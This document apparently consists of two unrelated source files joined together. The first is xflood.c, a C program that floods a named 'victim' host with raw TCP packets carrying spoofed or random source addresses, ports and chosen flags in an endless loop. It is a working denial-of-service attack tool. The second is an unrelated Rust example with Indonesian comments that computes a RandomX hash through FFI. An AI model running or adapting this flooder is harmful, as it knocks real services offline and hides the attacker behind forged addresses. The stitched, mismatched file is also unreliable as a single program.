/* xflood.c
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>

#define ENDIAN_LITTLE

int rawsock = 0;
unsigned int start;
unsigned int packets = 0;

unsigned short
csum (unsigned short * addr, int len)
{
  int nleft = len;
  unsigned int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(unsigned char *) (&answer) = *(unsigned char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

struct tcphdr2
{
  unsigned short th_sport;	/* source port */
  unsigned short th_dport;	/* destination port */
  unsigned int th_seq;		/* sequence number */
  unsigned int th_ack;		/* acknowledgement number */
  unsigned char th_x2:4;	/* (unused) */
  unsigned char th_off:4;	/* data offset */
  unsigned char th_flags;
  unsigned short th_win;	/* window */
  unsigned short th_sum;	/* checksum */
  unsigned short th_urp;	/* urgent pointer */
};

struct ip
{
#ifdef ENDIAN_LITTLE
  unsigned int ip_hl:4;		/* header length */
  unsigned int ip_v:4;		/* version */
#else
  unsigned int ip_v:4;		/* version */
  unsigned int ip_hl:4;		/* header length */
#endif
  unsigned char ip_tos;		/* type of service */
  unsigned short ip_len;	/* total length */
  unsigned short ip_id;		/* identification */
  unsigned short ip_off;	/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* dont fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
  unsigned char ip_ttl;		/* time to live */
  unsigned char ip_p;		/* protocol */
  unsigned short ip_sum;	/* checksum */
  struct in_addr ip_src, ip_dst;	/* source and dest address */
};

struct ph
{				/* rfc 793 tcp pseudo-header */
  unsigned long saddr, daddr;
  char mbz;
  char ptcl;
  unsigned short tcpl;
};

struct tcp_opthdr
{
  unsigned char op0;
  unsigned char op1;
  unsigned char op2;
  unsigned char op3;
  unsigned char op4;
  unsigned char op5;
  unsigned char op6;
  unsigned char op7;
/* we only need this if we use window scaling and timestamps */
#ifdef WSCALE
  unsigned char op8;
  unsigned char op9;
  unsigned char op10;
  unsigned char op11;
  unsigned char op12;
  unsigned char op13;
  unsigned char op14;
  unsigned char op15;
  unsigned char op16;
  unsigned char op17;
  unsigned char op18;
  unsigned char op19;
#endif
};

struct
{
  char buf[64];			/* 64 bytes for the packet */
  char ph[64];			/* 64 bytes for the paeudo header packet */
} tcpbuf;

unsigned int
lookup (char *hostname)
{
  struct hostent *name;
  unsigned int address;

  if ((address = inet_addr (hostname)) != -1)
    return address;
  if ((name = gethostbyname (hostname)) == NULL)
    return -1;

  memcpy (&address, name->h_addr, name->h_length);
  return address;
}

void handle_exit()
{
printf("Flood completed, %d packets sent, %d seconds, %d packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
exit(0);
}

void
attack (unsigned int dstip, unsigned int srcip, unsigned short dstport,
	unsigned short srcport, unsigned short flags)
{
  struct sockaddr_in sin;

/* make this global instead of pointers on the stack? */
  struct ip *xf_iphdr = (struct ip *) tcpbuf.buf;
  struct tcphdr2 *xf_tcphdr =
    (struct tcphdr2 *) (tcpbuf.buf + sizeof (struct ip));

/* for the pseudo header */
  struct ph *ps_iphdr = (struct ph *) tcpbuf.ph;
  struct tcphdr2 *ps_tcphdr =
    (struct tcphdr2 *) (tcpbuf.ph + sizeof (struct ph));

  xf_iphdr->ip_v = 4;
  xf_iphdr->ip_hl = 5;
  xf_iphdr->ip_tos = 0;

#ifdef MACOS
  xf_iphdr->ip_len =
    sizeof (struct ip) + sizeof (struct tcphdr2);
  xf_iphdr->ip_off = 0x4000;
#else
  xf_iphdr->ip_len =
    htons (sizeof (struct ip) + sizeof (struct tcphdr2));

  xf_iphdr->ip_off = htons (0x4000);
#endif
  xf_iphdr->ip_id = htons (random ());	/* random IP id */

  xf_iphdr->ip_ttl = 255;
  xf_iphdr->ip_p = IPPROTO_TCP;

  xf_tcphdr->th_seq = htonl (rand ());

  xf_tcphdr->th_off =
    (sizeof (struct tcphdr2) / 4);

  xf_tcphdr->th_x2 = 0;

  xf_tcphdr->th_ack = (random ());

/* large windows are more evil */
  xf_tcphdr->th_win = 65535;
  xf_tcphdr->th_urp = 0;

/* set the flags */
  xf_tcphdr->th_flags = flags;
  xf_iphdr->ip_src.s_addr = srcip;


/* *** Pseudo Header *** */
  ps_iphdr->mbz = 0;
  ps_iphdr->ptcl = IPPROTO_TCP;
  ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
  ps_iphdr->tcpl =
    htons (sizeof (struct tcphdr2));

  memcpy (ps_tcphdr, xf_tcphdr, sizeof (struct tcphdr2));

  xf_tcphdr->th_sport = htons (srcport);
  xf_tcphdr->th_dport = htons (dstport);

  ps_tcphdr->th_sport = htons (srcport);
  ps_tcphdr->th_dport = htons (dstport);

/* dest address */
  ps_iphdr->daddr = dstip;
  xf_iphdr->ip_dst.s_addr = dstip;

  for (;;)
    {

      if (dstport == 0)
	{			/* random dest ports */
	  xf_tcphdr->th_dport = random ();
	  ps_tcphdr->th_dport = xf_tcphdr->th_dport;
	}
      if (srcport == 0)
	{
	  xf_tcphdr->th_sport = random ();
	  ps_tcphdr->th_sport = xf_tcphdr->th_sport;
	}

      if (srcip == 0)
        {                       /* random source */
          xf_iphdr->ip_src.s_addr = rand () % 1006632960;
          ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
        }

/* we could do this globally too */
      sin.sin_family = AF_INET;
      sin.sin_port = xf_tcphdr->th_dport;
      sin.sin_addr.s_addr = dstip;

/* calculate tcp checksum */
      xf_tcphdr->th_sum = 0;
      xf_tcphdr->th_sum =
	csum ((unsigned short *) tcpbuf.ph,
	      sizeof (struct ph) + sizeof (struct tcphdr2));

/* send */
      sendto (rawsock, tcpbuf.buf,
	      sizeof (struct ip) + sizeof (struct tcphdr2), 0, (struct sockaddr *) &sin,
	      sizeof (sin));
      packets++;
    }

}

main (int argc, char **argv)
{
  unsigned int srcip, dstip;
  unsigned short dstport, srcport;
  unsigned char flags;

/* parse arguments */
  if (argc != 6)
    {
      printf ("usage : %s dest src destport srcport flags\n\n", argv[0]);
      printf ("dest       = the victim ip/host\n");
      printf ("src        = ip to spoof the attack as\n");
      printf ("destport   = port to attack on the victim\n");
      printf ("srcport    = port which the packets will come from\n");
      printf ("flags      = tcp packet flags\n");
      exit (0);
    }

/* allocate socket */
  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (rawsock <= 0)
    {
      printf ("Error opening raw socket\n");
      exit (-1);
    }

  dstip = lookup (argv[1]);
  if (dstip <= 0)
    {
      printf ("Cant resolve victim\n");
    }
  srcip = lookup (argv[2]);
  if (srcip <= 0)
    {
      printf ("Cant resolve source address\n");
    }

  dstport = atoi (argv[3]);
  srcport = atoi (argv[4]);
  flags = atoi (argv[5]);

  signal (SIGINT, handle_exit);
  signal (SIGTERM, handle_exit);
  signal (SIGQUIT, handle_exit);
  start = time (NULL);
  attack (dstip, srcip, dstport, srcport, flags);

}

// Izinkan beberapa fitur yang mungkin berguna atau dibutuhkan oleh kode yang dihasilkan bindgen
#![allow(non_upper_case_globals)]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
#![allow(dead_code)] // Kita mungkin tidak menggunakan semua fungsi dari bindings

// Sertakan bindings yang dihasilkan oleh build.rs
// Ini akan mengambil kode dari $OUT_DIR/bindings.rs
mod ffi {
    include!(concat!(env!("OUT_DIR"), "/bindings.rs"));
}

// Gunakan tipe dan fungsi dari libc jika diperlukan (seringkali sudah ditangani oleh bindgen)
use libc::{c_void, size_t};
use std::ffi::CString; // Untuk mengubah string Rust ke string C (jika input berupa string)
use std::ptr; // Untuk pointer null

fn main() {
    println!("Mencoba menggunakan RandomX dari Rust...");

    // 1. Tentukan Flags untuk RandomX
    //    Kita akan menggunakan JIT (Just-In-Time compilation) dan AES perangkat keras jika tersedia.
    //    Ini adalah mode "light" (tanpa dataset penuh) untuk contoh awal.
    let flags = unsafe { ffi::randomx_get_flags() };
    let mut effective_flags = ffi::randomx_flags_RANDOMX_FLAG_JIT | ffi::randomx_flags_RANDOMX_FLAG_DEFAULT; // Mulai dengan default & JIT

    // Tambahkan Hard AES jika didukung
    if (flags & ffi::randomx_flags_RANDOMX_FLAG_HARD_AES) == ffi::randomx_flags_RANDOMX_FLAG_HARD_AES {
        println!("AES Perangkat Keras didukung dan akan digunakan.");
        effective_flags |= ffi::randomx_flags_RANDOMX_FLAG_HARD_AES;
    } else {
        println!("AES Perangkat Keras TIDAK didukung atau tidak dipilih, menggunakan implementasi software (jika ada).");
        // Jika tidak ada Hard AES, kita bisa memilih Soft AES jika diperlukan oleh algoritma,
        // tapi untuk RandomX, JIT biasanya yang utama.
        // Untuk contoh ini, kita biarkan RandomX menangani fallback jika perlu.
    }
    // Untuk contoh cepat, kita tidak menggunakan RANDOMX_FLAG_FULL_MEM (yang butuh dataset besar)
    // Kita akan menggunakan mode "light" yang hanya butuh cache.

    println!("Flags yang akan digunakan: {:?}", effective_flags);


    // 2. Alokasi dan Inisialisasi Cache RandomX
    //    Cache membutuhkan "key" (seed) untuk inisialisasi.
    let cache_key_data: [u8; 32] = [0; 32]; // Contoh key 32 byte (isi dengan seed block hash di aplikasi nyata)
    let mut rx_cache: *mut ffi::randomx_cache = ptr::null_mut();

    unsafe {
        rx_cache = ffi::randomx_alloc_cache(effective_flags);
        if rx_cache.is_null() {
            panic!("Gagal mengalokasikan RandomX cache!");
        }

        // Inisialisasi cache dengan key
        let init_cache_result = ffi::randomx_init_cache(
            rx_cache,
            cache_key_data.as_ptr() as *const c_void, // Pointer ke key data
            cache_key_data.len() as size_t,          // Ukuran key data
        );
        if init_cache_result != ffi::randomx_errno_RANDOMX_ERRNO_SUCCESS {
             panic!("Gagal menginisialisasi RandomX cache! Kode error: {}", init_cache_result);
        }
        println!("RandomX Cache berhasil dialokasikan dan diinisialisasi.");
    }

    // 3. Membuat Virtual Machine (VM) RandomX
    //    Untuk mode "light", kita hanya memberikan cache (dataset bisa null).
    let mut rx_vm: *mut ffi::randomx_vm = ptr::null_mut();
    unsafe {
        rx_vm = ffi::randomx_create_vm(effective_flags, rx_cache, ptr::null_mut()); // Dataset null untuk mode light
        if rx_vm.is_null() {
            // Penting: bersihkan cache jika VM gagal dibuat setelah cache dialokasikan
            ffi::randomx_release_cache(rx_cache);
            panic!("Gagal membuat RandomX VM!");
        }
        println!("RandomX VM berhasil dibuat.");
    }

    // 4. Siapkan data input untuk di-hash
    let input_string = "Ini adalah data input untuk di-hash oleh RandomX";
    let input_data = CString::new(input_string).expect("CString::new gagal");
    let input_bytes = input_data.as_bytes_with_nul(); // Dapat berupa .as_bytes() jika tidak perlu null-terminated dari CString

    // Siapkan buffer untuk output hash (RandomX menghasilkan hash 32 byte)
    let mut output_hash: [u8; ffi::RANDOMX_HASH_SIZE as usize] = [0; ffi::RANDOMX_HASH_SIZE as usize];

    println!("Input untuk di-hash: \"{}\"", input_string);

    // 5. Hitung Hash menggunakan RandomX
    unsafe {
        let calculate_hash_result = ffi::randomx_calculate_hash(
            rx_vm,                                  // Pointer ke VM
            input_bytes.as_ptr() as *const c_void,  // Pointer ke data input
            input_bytes.len() as size_t,            // Ukuran data input
            output_hash.as_mut_ptr() as *mut c_void, // Pointer ke buffer output
        );
         if calculate_hash_result != ffi::randomx_errno_RANDOMX_ERRNO_SUCCESS {
            // Penting: bersihkan sumber daya sebelum panik jika terjadi error
            ffi::randomx_destroy_vm(rx_vm);
            ffi::randomx_release_cache(rx_cache);
            panic!("Gagal menghitung hash RandomX! Kode error: {}", calculate_hash_result);
        }
    }

    // 6. Cetak hasil hash (dalam format hexadecimal)
    print!("Hasil Hash RandomX (hex): ");
    for byte in output_hash.iter() {
        print!("{:02x}", byte);
    }
    println!();

    // 7. Bersihkan sumber daya RandomX (sangat penting!)
    unsafe {
        println!("Membersihkan sumber daya RandomX...");
        ffi::randomx_destroy_vm(rx_vm);
        // Jika kita menggunakan dataset, kita juga perlu randomx_release_dataset(rx_dataset);
        ffi::randomx_release_cache(rx_cache);
        println!("Sumber daya RandomX berhasil dibersihkan.");
    }

    println!("Contoh RandomX selesai.");
}
